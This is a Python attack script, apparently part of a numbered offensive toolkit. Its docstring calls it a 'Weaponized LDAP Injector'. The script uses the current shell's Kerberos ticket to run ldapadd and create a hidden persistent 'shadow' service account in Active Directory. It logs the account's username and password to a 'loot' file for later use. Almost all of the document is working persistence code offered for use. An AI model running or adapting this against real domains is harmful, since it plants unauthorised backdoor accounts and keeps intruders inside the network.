import os
import sys
import subprocess

def create_shadow_ad_account(username, password, domain_dn):
    """
    Weaponized LDAP Injector: Attempts to use local Kerberos tickets 
    to create a persistent Service Account in Active Directory.
    """
    print(f"[*] Targeting Domain: {domain_dn}")
    print(f"[*] Creating Shadow Account: {username}")

    # LDIF (LDAP Data Interchange Format) content for the new user
    ldif_content = f"""dn: CN={username},CN=Users,{domain_dn}
changetype: add
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: {username}
sn: Service
givenName: Shadow
sAMAccountName: {username}
userPassword: {password}
servicePrincipalName: HOST/{username}.chimera.local
userAccountControl: 512
"""
    
    ldif_path = "/tmp/shadow.ldif"
    
    try:
        with open(ldif_path, "w") as f:
            f.write(ldif_content)

        print("[*] Attempting LDAP Injection via GSSAPI (Kerberos)...")
        # Uses the existing shell's Kerberos ticket (CCACHE) to authenticate
        result = subprocess.run([
            "ldapadd", "-Y", "GSSAPI", "-f", ldif_path
        ], capture_output=True, text=True)

        if result.returncode == 0:
            print(f"[!!!] SUCCESS: Domain Account {username} created.")
            # Log to project loot
            loot_path = "../../../loot/persistence_history.log"
            with open(loot_path, "a") as log:
                log.write(f"Type: AD_SHADOW_ADMIN | User: {username} | Pass: {password}\n")
        else:
            print(f"[-] LDAP Injection Failed: {result.stderr}")

    except Exception as e:
        print(f"[-] AD Injection Fault: {e}")
    finally:
        if os.path.exists(ldif_path):
            os.remove(ldif_path)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: 172_shadow_admin <username> <password> <domain_dn>")
        print("Example: 172_shadow_admin 'svc_backup' 'P@ssw0rd123' 'DC=corp,DC=local'")
        sys.exit(1)
    
    create_shadow_ad_account(sys.argv[1], sys.argv[2], sys.argv[3])
